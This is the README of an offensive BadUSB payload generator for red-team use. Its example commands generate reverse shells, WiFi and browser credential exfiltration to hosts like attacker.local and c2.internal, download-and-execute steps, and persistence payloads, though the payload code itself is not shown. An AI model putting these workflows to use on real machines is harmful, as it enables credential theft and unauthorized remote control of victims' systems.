# BadUSB Payload Generator

## Overview

A Python-based tool for generating DuckyScript payloads from predefined templates. Designed for authorized security testing, red team exercises, and training purposes.

## Requirements

- Python 3.6+
- No external dependencies

## Usage

### List Available Templates

```bash
python payload_generator.py --list
```

### Generate Payload

```bash
# Windows reverse shell
python payload_generator.py -t reverse_shell_windows -p ip=192.168.1.100 -p port=4444

# Linux reconnaissance
python payload_generator.py -t recon_linux -p exfil_url=http://10.0.0.1:8080/collect

# WiFi credential extraction
python payload_generator.py -t wifi_extract_windows -p exfil_url=http://attacker.local/collect
```

### Save to File

```bash
python payload_generator.py -t reverse_shell_windows -p ip=192.168.1.100 -p port=4444 -o payload.txt
```

### Validate Payload

```bash
python payload_generator.py -t reverse_shell_windows -p ip=192.168.1.100 -p port=4444 --validate
```

## Available Templates

| Template | OS | Description |
|----------|-------|-------------|
| `reverse_shell_windows` | Windows | PowerShell reverse shell |
| `reverse_shell_linux` | Linux | Bash reverse shell |
| `reverse_shell_macos` | macOS | Bash reverse shell |
| `recon_windows` | Windows | System info collection |
| `recon_linux` | Linux | System info collection |
| `wifi_extract_windows` | Windows | WiFi password extraction |
| `persistence_registry` | Windows | Registry Run key persistence |
| `persistence_cron` | Linux | Crontab persistence |
| `persistence_launchagent` | macOS | LaunchAgent persistence |
| `download_execute` | Windows | Download and execute file |
| `exfil_browser_windows` | Windows | Browser data exfiltration |

## Parameters

Each template requires specific parameters:

- `ip` - Attacker IP address
- `port` - Listening port
- `exfil_url` - URL for data exfiltration
- `payload_url` - URL for payload download
- `file_url` - URL for file download

## Example Workflows

### Red Team: Establish Foothold

```bash
# Generate reverse shell
python payload_generator.py -t reverse_shell_windows \
    -p ip=10.0.0.50 -p port=443 \
    -o foothold.txt

# Generate persistence
python payload_generator.py -t persistence_registry \
    -p payload_url=http://10.0.0.50/persist.ps1 \
    -o persist.txt
```

### Data Collection

```bash
# Collect system info
python payload_generator.py -t recon_windows \
    -p exfil_url=http://c2.internal:8080/collect \
    -o recon.txt

# Collect WiFi credentials
python payload_generator.py -t wifi_extract_windows \
    -p exfil_url=http://c2.internal:8080/wifi \
    -o wifi.txt
```

## Extending the Generator

### Adding Custom Templates

Edit `payload_generator.py` and add to the `TEMPLATES` dictionary:

```python
TEMPLATES["custom_template"] = {
    "name": "Custom Template",
    "description": "Description of what it does",
    "os": "windows",  # or "linux", "macos"
    "params": ["param1", "param2"],
    "template": """REM Custom Payload
DELAY 1000
STRING Your payload here with {param1} and {param2}
ENTER
"""
}
```

### Template Syntax

- Use `{param_name}` for parameter substitution
- Standard DuckyScript syntax
- REM comments for documentation

## Security Considerations

- Only use on systems you own or have explicit authorization to test
- Never deploy against production systems without proper approvals
- Log all testing activities
- Clean up after testing

## Legal Warning

```
This tool is provided for authorized security testing only.
Unauthorized access to computer systems is illegal.
Always obtain proper authorization before testing.
The authors assume no liability for misuse.
```

---

[← Back to Main](../../README.md)
